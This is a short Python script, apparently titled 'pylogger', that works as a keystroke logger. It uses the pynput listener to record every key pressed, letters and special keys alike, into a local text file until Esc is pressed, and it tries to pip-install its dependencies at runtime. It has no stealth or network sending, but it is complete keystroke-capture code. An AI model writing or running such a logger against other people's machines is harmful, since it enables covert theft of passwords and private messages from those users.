import pip
from pynput import keyboard
import datetime

# Installs packages if missing
def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])

if __name__ == '__main__':
    install('datetime')
    install('pynput')



now = datetime.datetime.now()
strnow = str(now)
file1 = open('./myfile.txt', 'a')
file1.write('\n Staring pylogger \n')
file1.write(strnow)
file1.close()



def on_press(key):
    try:
        file1 = open('./myfile.txt', 'a')
        file1.write('\n')
        file1.write('alphanumeric key {0} pressed'.format(
            key.char))
        file1.close()

    except AttributeError:
        file1 = open('./myfile.txt', 'a')
        file1.write('special key {0} pressed'.format(
            key))
        file1.close()

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()